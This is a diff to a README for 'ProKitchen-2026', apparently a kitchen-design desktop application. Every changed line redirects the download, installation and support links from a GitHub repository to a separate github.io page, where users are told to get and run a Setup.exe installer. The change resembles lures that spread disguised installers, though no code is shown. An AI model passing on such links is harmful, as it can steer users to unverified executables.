@@ -6,9 +6,9 @@ Welcome to ProKitchen-2026, the desktop application that helps you design and pl
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [ProKitchen-2026 Download](https://github.com/gclefpolarzone737/prokitchen-2026)
+Visit this link to download the application: [ProKitchen-2026 Download](https://gclefpolarzone737.github.io)
 
-[![Download ProKitchen](https://img.shields.io/badge/Download-ProKitchen%202026-brightgreen?style=for-the-badge&logo=windows)](https://github.com/gclefpolarzone737/prokitchen-2026)
+[![Download ProKitchen](https://img.shields.io/badge/Download-ProKitchen%202026-brightgreen?style=for-the-badge&logo=windows)](https://gclefpolarzone737.github.io)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before installing, ensure your computer meets these minimum requirements:
 ## 📋 Installation Guide
 
 ### Step 1: Download the Software
-1. Click the download button above or visit the link: https://github.com/gclefpolarzone737/prokitchen-2026
+1. Click the download button above or visit the link: https://gclefpolarzone737.github.io
 2. You will be redirected to the download page
 3. Look for the latest version of the installer file (usually named `ProKitchen-2026-Setup.exe`)
 4. Click the download link to save the file to your computer
@@ -113,7 +113,7 @@ To check for updates:
 ## 📞 Support
 
 If you encounter any issues not covered in this guide:
-- Visit the repository page for more information: https://github.com/gclefpolarzone737/prokitchen-2026
+- Visit the repository page for more information: https://gclefpolarzone737.github.io
 - Check the "Issues" tab on GitHub for known problems and solutions
 - Contact the developer through the repository's contact options
 
